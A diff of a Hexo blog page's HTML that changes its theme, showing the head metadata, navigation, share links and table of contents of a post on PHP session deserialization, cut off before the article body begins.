@@ -1,550 +1,192 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang=en>
 <head>
+    <!-- so meta -->
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="keywords" content="Hexo Theme Redefine">
-    
-    <meta name="author" content="baozongwi">
-    <!-- preconnect -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-
-    
-        
-        
-        
-            <link rel="preconnect" href="https://registry.npmmirror.com" crossorigin>
-        
-    
-    <!--- Seo Part-->
-    
-    <link rel="canonical" href="https://baozongwi.xyz/2024/09/11/浅谈session反序列化/"/>
-    <meta name="robots" content="index,follow">
-    <meta name="googlebot" content="index,follow">
-    <meta name="revisit-after" content="1 days">
-    
-    
-    
-        
-        <meta name="description" content="baozongwi的好东西">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="session反序列化的奥妙">
 <meta property="og:type" content="article">
 <meta property="og:title" content="浅谈session反序列化">
 <meta property="og:url" content="https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
 <meta property="og:site_name" content="baozongwi:Hacking the future">
-<meta property="og:description" content="baozongwi的好东西">
+<meta property="og:description" content="session反序列化的奥妙">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://baozongwi.xyz/images/wallhaven-6drlmx.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieves/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/QQ20240912-111641.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieves/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/QQ20240912-111713.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieves/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/QQ20240912-112606.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieves/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/QQ20240912-112611.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieves/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/QQ20240912-130314.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieves/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/QQ20240912-204615.png">
 <meta property="article:published_time" content="2024-09-11T08:15:57.000Z">
 <meta property="article:modified_time" content="2024-10-21T07:56:00.273Z">
 <meta property="article:author" content="baozongwi">
 <meta property="article:tag" content="session">
 <meta property="article:tag" content="姿势">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://baozongwi.xyz/images/wallhaven-6drlmx.jpg">
+<meta name="twitter:image" content="https://baozongwi.xyz/images/achieves/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/QQ20240912-111641.png">
     
     
-    <!--- Icon Part-->
-    <link rel="icon" type="image/png" href="/images/acvtar.jpg" sizes="192x192">
-    <link rel="apple-touch-icon" sizes="180x180" href="/images/acvtar.jpg">
-    <meta name="theme-color" content="#262424">
-    <link rel="shortcut icon" href="/images/acvtar.jpg">
-    <!--- Page Info-->
-    
-    <title>
+      
         
-            浅谈session反序列化 | baozongwi&#39;s blog
+          <link rel="shortcut icon" href="/images/favicon.ico">
         
-    </title>
-
-    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/Chillax/chillax.css">
-
-    <!--- Inject Part-->
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
     
+    <!-- title -->
+    <title>浅谈session反序列化</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
 
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
     
 <link rel="stylesheet" href="/css/style.css">
 
-
+    <!-- persian styles -->
     
-        <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/css/build/tailwind.css">
-    
-
-    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/GeistMono/geist-mono.css">
-    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/Geist/geist.css">
-    <!--- Font Part-->
+    <!-- rss -->
     
     
+      <link rel="alternate" href="/true" title="baozongwi:Hacking the future" type="application/atom+xml" />
     
-    
-    
-    
-
-    <script id="hexo-configurations">
-    window.config = {"hostname":"baozongwi.xyz","root":"/","language":"en","path":"search.json"};
-    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":true,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-6drlmx.jpg","skip_dirs":[]}},"colors":{"primary":"#262424","secondary":null,"default_mode":"auto"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/wallhaven-6drlmx.jpg","description":"baozongwi的好东西"},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-6drlmx.jpg","dark":"/images/wallhaven-1jpk51.jpg"},"title":"h@cking th3 fu1rue","subtitle":{"text":["天地不仁，以万物为刍狗","你为何懒惰又好胜"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":400,"backing_speed":30,"starting_delay":50,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/baozongwi","email":"2405758945@qq.com"},"qrs":{"fa-solid fa-yen-sign":"https://baozongwi.xyz/images/sponse/wechat.jpg","fa-solid fa-dollar-sign":"https://baozongwi.xyz/images/sponse/alipay.jpg"}}},"plugins":{"feed":{"enable":true},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"9.3.0"}},"version":"2.8.2","navbar":{"auto_hide":true,"color":{"left":"#033140","right":"#0caff5","transparency":20},"width":{"home":"1200px","pages":"1000px"},"tags":{"Tags":{"icon":"fa-solid fa-tags","path":"/tags/"}},"categories":{"Categories":{"icon":"fa-solid fa-folder","path":"/categories/"}},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Teacher":"/teacher"}},"Links":{"icon":"fa-regular fa-link","submenus":{"Friends":"/friends","Bookmarks":"/bookmarks","Essays":"/essays"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"hexo博客已经完成，搭建博客的师傅可以试试看哦，最近可能不怎么更新了，得突击一下期末了师傅们！","show_on_mobile":true,"links":{"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":50,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":6}},"footerStart":"2024/8/08 11:45:14"};
-    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
-    window.data = {"masonry":false};
-  </script>
-    
-    <!--- Fontawesome Part-->
-    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/fontawesome.min.css">
-    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/brands.min.css">
-    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/solid.min.css">
-    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/regular.min.css">
-    
-    
-    
-    
-<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="baozongwi:Hacking the future" type="application/atom+xml">
-</head>
-
-
-
-<body>
-	<div class="progress-bar-container">
+	<!-- mathjax -->
 	
-	<span class="scroll-progress-bar"></span>
-	
+<meta name="generator" content="Hexo 7.3.0"></head>
 
-	
-	<span class="pjax-progress-bar"></span>
-	<!--        <span class="swup-progress-icon">-->
-	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
-	<!--        </span>-->
-	
-</div>
-
-<main class="page-container" id="swup">
-
-	
-
-	<div class="main-content-container flex flex-col justify-between min-h-dvh">
-		<div class="main-content-header">
-			<header class="navbar-container px-6 md:px-12">
-    <div class="navbar-content transition-navbar ">
-        <div class="left">
-            
-                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
-                    <img src="/images/acvtar.jpg" class="w-full h-full rounded-sm">
-                </a>
-            
-            <a class="logo-title" href="/">
-                
-                baozongwi&#39;s blog
-                
-            </a>
-        </div>
-
-        <div class="right">
-            <!-- PC -->
-            <div class="desktop">
-                <ul class="navbar-list">
-                    
-                        
-                            
-
-                            <li class="navbar-item">
-                                <!-- Menu -->
-                                <a class=""
-                                   href="/"
-                                        >
-                                    <i class="fa-regular fa-house fa-fw"></i>
-                                    HOME
-                                    
-                                </a>
-
-                                <!-- Submenu -->
-                                
-                            </li>
-                    
-                        
-                            
-
-                            <li class="navbar-item">
-                                <!-- Menu -->
-                                <a class=""
-                                   href="/archives"
-                                        >
-                                    <i class="fa-regular fa-archive fa-fw"></i>
-                                    ARCHIVES
-                                    
-                                </a>
-
-                                <!-- Submenu -->
-                                
-                            </li>
-                    
-                        
-                            
-
-                            <li class="navbar-item">
-                                <!-- Menu -->
-                                <a class="has-dropdown"
-                                   href="#"
-                                        onClick=&#34;return false;&#34;>
-                                    <i class="fa-regular fa-user fa-fw"></i>
-                                    ABOUT
-                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
-                                </a>
-
-                                <!-- Submenu -->
-                                
-                                    <ul class="sub-menu">
-                                        
-                                            <li>
-                                                <a href="/about">
-                                                    ME
-                                                </a>
-                                            </li>
-                                        
-                                            <li>
-                                                <a href="/teacher">
-                                                    TEACHER
-                                                </a>
-                                            </li>
-                                        
-                                    </ul>
-                                
-                            </li>
-                    
-                        
-                            
-
-                            <li class="navbar-item">
-                                <!-- Menu -->
-                                <a class="has-dropdown"
-                                   href="#"
-                                        onClick=&#34;return false;&#34;>
-                                    <i class="fa-regular fa-link fa-fw"></i>
-                                    LINKS
-                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
-                                </a>
-
-                                <!-- Submenu -->
-                                
-                                    <ul class="sub-menu">
-                                        
-                                            <li>
-                                                <a href="/friends">
-                                                    FRIENDS
-                                                </a>
-                                            </li>
-                                        
-                                            <li>
-                                                <a href="/bookmarks">
-                                                    BOOKMARKS
-                                                </a>
-                                            </li>
-                                        
-                                            <li>
-                                                <a href="/essays">
-                                                    ESSAYS
-                                                </a>
-                                            </li>
-                                        
-                                    </ul>
-                                
-                            </li>
-                    
-                    
-                        <li class="navbar-item search search-popup-trigger">
-                            <i class="fa-solid fa-magnifying-glass"></i>
-                        </li>
-                    
-                </ul>
-            </div>
-            <!-- Mobile -->
-            <div class="mobile">
-                
-                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
-                    </div>
-                
-                <div class="icon-item navbar-bar">
-                    <div class="navbar-bar-middle"></div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Mobile sheet -->
-    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
-        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
-            
-                
-                    
-
-                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
-                        
-                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
-                           href="/"
-                        >
-                            <span>
-                                HOME
-                            </span>
-                            
-                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
-                            
-                        </a>
-                        
-
-                        
-                    </li>
-            
-                
-                    
-
-                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
-                        
-                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
-                           href="/archives"
-                        >
-                            <span>
-                                ARCHIVES
-                            </span>
-                            
-                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
-                            
-                        </a>
-                        
-
-                        
-                    </li>
-            
-                
-                    
-
-                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
-                        
-                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
-                             navbar-data-toggle="submenu-About"
-                        >
-                            <span>
-                                ABOUT
-                            </span>
-                            
-                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
-                            
-                        </div>
-                        
-
-                        
-                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
-                                
-                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
-                                        <a class=" text-third-text-color text-xl"
-                                           href="/about">ME</a>
-                                    </div>
-                                
-                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
-                                        <a class=" text-third-text-color text-xl"
-                                           href="/teacher">TEACHER</a>
-                                    </div>
-                                
-                            </div>
-                        
-                    </li>
-            
-                
-                    
-
-                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
-                        
-                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
-                             navbar-data-toggle="submenu-Links"
-                        >
-                            <span>
-                                LINKS
-                            </span>
-                            
-                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
-                            
-                        </div>
-                        
-
-                        
-                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-Links">
-                                
-                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
-                                        <a class=" text-third-text-color text-xl"
-                                           href="/friends">FRIENDS</a>
-                                    </div>
-                                
-                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
-                                        <a class=" text-third-text-color text-xl"
-                                           href="/bookmarks">BOOKMARKS</a>
-                                    </div>
-                                
-                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
-                                        <a class=" text-third-text-color text-xl"
-                                           href="/essays">ESSAYS</a>
-                                    </div>
-                                
-                            </div>
-                        
-                    </li>
-            
-
-            
-            
-                
-                    
-                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
-                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
-                           href="/tags"
-                        >
-                            <span>Tags</span>
-                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
-                        </a>
-                    </li>
-                
-                    
-                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
-                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
-                           href="/categories"
-                        >
-                            <span>Categories</span>
-                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
-                        </a>
-                    </li>
-                
-            
-        </ul>
-
-        <div class="statistics flex justify-around my-2.5">
-    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">34</div>
-        <div class="label text-third-text-color text-sm">Tags</div>
-    </a>
-    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
-        <div class="label text-third-text-color text-sm">Categories</div>
-    </a>
-    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">129</div>
-        <div class="label text-third-text-color text-sm">Posts</div>
-    </a>
-</div>
-    </div>
-
-    <div class="window-mask"></div>
-
-</header>
-
-
-		</div>
-
-		<div class="main-content-body transition-fade-up">
-			
-
-			<div class="main-content">
-				<div class="post-page-container flex relative justify-between box-border w-full h-full">
-	<div class="article-content-container">
-
-		<div class="article-title relative w-full">
-			
-			<div class="w-full flex items-center pt-6 justify-start">
-				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">浅谈session反序列化</h1>
-			</div>
-			
-		</div>
-
-		
-		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
-			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
-				<img src="/images/acvtar.jpg">
-			</div>
-			<div class="info flex flex-col justify-between">
-				<div class="author flex items-center">
-					<span class="name text-default-text-color text-lg font-semibold">baozongwi</span>
-					
-					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv6</span>
-					
-				</div>
-				<div class="meta-info">
-					<div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2024-09-11 16:15:57</span>
-        <span class="mobile">2024-09-11 16:15:57</span>
-        <span class="hover-info">Created</span>
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     -->
+      </ul>
     </span>
-    
-        <span class="article-date article-meta-item">
-            <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-10-21 15:56</span>
-            <span class="mobile">2024-10-21 15:56</span>
-            <span class="hover-info">Updated</span>
-        </span>
-    
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/09/14/php-GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/09/09/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E4%BA%AC%E6%B4%A5%E5%86%80/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=浅谈session反序列化"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=浅谈session反序列化"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=浅谈session反序列化"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=浅谈session反序列化&body=Check out this article: https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=浅谈session反序列化"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=浅谈session反序列化"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=浅谈session反序列化"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=浅谈session反序列化"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=浅谈session反序列化&description=session反序列化的奥妙"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=浅谈session反序列化"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
 
-    
-        <span class="article-categories article-meta-item">
-            <i class="fa-regular fa-folders"></i>&nbsp;
-            <ul>
-                
-                
-                    
-                        
-                        <li>
-                            <a href="/categories/talk/">talk</a>&nbsp;
-                        </li>
-                    
-                    
-                
-            </ul>
-        </span>
+    </div>
     
     
-        <span class="article-tags article-meta-item">
-            <i class="fa-regular fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/session/">session</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/%E5%A7%BF%E5%8A%BF/">姿势</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-question"><span class="toc-number">2.</span> <span class="toc-text">0x02 question</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">2.1.</span> <span class="toc-text">概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#session-%E6%9C%AC%E8%BA%AB%E6%9C%BA%E5%88%B6"><span class="toc-number">2.1.1.</span> <span class="toc-text">session 本身机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E5%95%A5%E8%A6%81%E7%94%A8session"><span class="toc-number">2.1.2.</span> <span class="toc-text">为啥要用session</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E7%9A%84%E4%BA%A7%E7%94%9F%E5%92%8C%E5%82%A8%E5%AD%98"><span class="toc-number">2.1.3.</span> <span class="toc-text">session的产生和储存</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.2.</span> <span class="toc-text">session反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Demo"><span class="toc-number">2.3.</span> <span class="toc-text">Demo</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-1"><span class="toc-number">2.3.1.</span> <span class="toc-text">Demo 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-2"><span class="toc-number">2.3.2.</span> <span class="toc-text">Demo 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-3"><span class="toc-number">2.3.3.</span> <span class="toc-text">Demo 3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%8D%E6%80%9D%E8%80%83"><span class="toc-number">2.4.</span> <span class="toc-text">再思考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%B0%8F%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">0x03 小结</span></a></li></ol>
+      </div>
     
-
-    
-    
-        <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>3.7k Words</span>
-        </span>
-    
-    
-        <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>17 Mins</span>
-        </span>
-    
-    
-        <span class="article-pv article-meta-item">
-            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-        </span>
-    
+  </span>
 </div>
 
-				</div>
-			</div>
-		</div>
-		
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        浅谈session反序列化
+    </h1>
 
-		
 
 
-		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
